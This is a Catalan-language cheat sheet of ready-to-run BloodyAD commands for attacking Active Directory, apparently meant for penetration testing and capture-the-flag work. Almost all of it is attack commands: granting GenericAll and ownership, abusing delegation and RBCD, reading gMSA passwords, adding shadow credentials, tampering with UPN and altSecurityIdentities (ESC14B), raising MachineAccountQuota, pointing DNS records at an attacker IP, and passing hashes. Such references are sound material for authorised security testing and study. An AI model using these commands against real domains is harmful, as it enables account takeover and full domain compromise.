# BloodyAD Cheatsheet 🩸

Una guia ràpida per a l'ús de **BloodyAD**, una eina per automatitzar tasques d'Active Directory, incloent gestió d'usuaris, canvis de contrasenya i escalada de privilegis.

**Autor original:** [serioton](https://adminions.ca/books/the-team/page/serioton)
**Recopilat per:** EscorBot 🦂

---

## 🛠️ Comandes Bàsiques

### Obtenir informació d'un usuari
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```

### Afegir usuari a un grup
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```

### Canviar contrasenya
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```

### Habilitar un compte desactivat
```bash
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```

---

## 🔑 Privilegis i Delegació

### Donar drets GenericAll
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```

### Assignar Propietari (WriteOwner)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```

### Afegir flag TRUSTED_TO_AUTH_FOR_DELEGATION
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

### Afegir RBCD (Resource Based Constrained Delegation)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

---

## 🔍 Atributs i Cerques

### Llegir contrasenya de gMSA
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```

### Modificar UPN (User Principal Name)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn
```

### Comprovar UPN modificat
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName
```

### Modificar Mail
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v [email protected]
```

### Modificar altSecurityIdentities (ESC14B)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>[email protected]'
```

### Escriure SPN
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```

### Trobar atributs editables (Writable)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```

---

## 🖥️ Gestió de Màquines i DNS

### Enumerar MachineAccountQuota
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
```

### Canviar MachineAccountQuota a 10
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
```

### Crear un nou compte de màquina
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
```

### Registrar un registre DNS
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_name $attacker_ip
```

---

## 💀 Objectes Esborrats i Avançat

### Shadow Credentials
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```

### Trobar objectes esborrats
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```

### Restaurar un objecte esborrat
```bash
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

### Cerques esteses (Tombstoned)
```bash
bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```

---

## 📝 Notes d'Ús
- Utilitza `-k` per fer servir autenticació **Kerberos**.
- Pots passar un **hash d'usuari** en lloc de contrasenya amb `-p :hash`.
- Especifica el format per a la contrasenya o hash amb `-f` (ex: `-f rc4`).
